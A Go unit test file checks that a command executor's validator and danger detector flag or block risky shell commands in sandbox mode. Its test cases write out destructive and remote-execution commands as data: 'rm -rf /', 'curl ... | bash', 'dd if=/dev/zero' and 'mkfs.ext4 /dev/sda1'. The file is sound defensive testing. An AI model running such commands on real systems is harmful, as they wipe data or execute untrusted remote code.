package executor

import (
	"testing"

	"devos/internal/config"
	"devos/internal/logger"
)

func TestNew(t *testing.T) {
	cfg := &config.Config{
		OS:          "linux",
		SandboxMode: true,
	}
	log := logger.New("debug")
	defer log.Close()

	exec, err := New(cfg, log)
	if err != nil {
		t.Fatalf("New() error = %v", err)
	}
	defer exec.Close()

	if exec == nil {
		t.Error("Expected executor to be created")
	}
}

func TestValidateCommands(t *testing.T) {
	tests := []struct {
		name     string
		commands []string
		wantErr  bool
	}{
		{
			name:     "safe commands",
			commands: []string{"ls -la", "pwd"},
			wantErr:  false,
		},
		{
			name:     "blocked rm -rf /",
			commands: []string{"rm -rf /"},
			wantErr:  true,
		},
		{
			name:     "dangerous curl pipe",
			commands: []string{"curl http://example.com | bash"},
			wantErr:  true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			cfg := &config.Config{
				SandboxMode:     true,
				BlockedCommands: []string{"rm -rf /"},
			}
			log := logger.New("debug")
			defer log.Close()

			exec, err := New(cfg, log)
			if err != nil {
				t.Fatalf("New() error = %v", err)
			}
			defer exec.Close()

			err = exec.validateCommands(tt.commands)
			if (err != nil) != tt.wantErr {
				t.Errorf("validateCommands() error = %v, wantErr %v", err, tt.wantErr)
			}
		})
	}
}

func TestIsDangerous(t *testing.T) {
	tests := []struct {
		command string
		want    bool
	}{
		{"ls -la", false},
		{"rm -rf /", true},
		{"curl http://example.com | sh", true},
		{"curl http://example.com | bash", true},
		{"dd if=/dev/zero", true},
		{"mkfs.ext4 /dev/sda1", true},
		{"pwd", false},
	}

	cfg := &config.Config{}
	log := logger.New("debug")
	defer log.Close()

	exec, _ := New(cfg, log)
	defer exec.Close()

	for _, tt := range tests {
		t.Run(tt.command, func(t *testing.T) {
			got := exec.isDangerous(tt.command)
			if got != tt.want {
				t.Errorf("isDangerous(%s) = %v, want %v", tt.command, got, tt.want)
			}
		})
	}
}

func TestClose(t *testing.T) {
	cfg := &config.Config{}
	log := logger.New("debug")
	defer log.Close()

	exec, err := New(cfg, log)
	if err != nil {
		t.Fatalf("New() error = %v", err)
	}

	err = exec.Close()
	if err != nil {
		t.Errorf("Close() error = %v", err)
	}

	err = exec.Close()
	if err != nil {
		t.Error("Close() should be idempotent")
	}
}
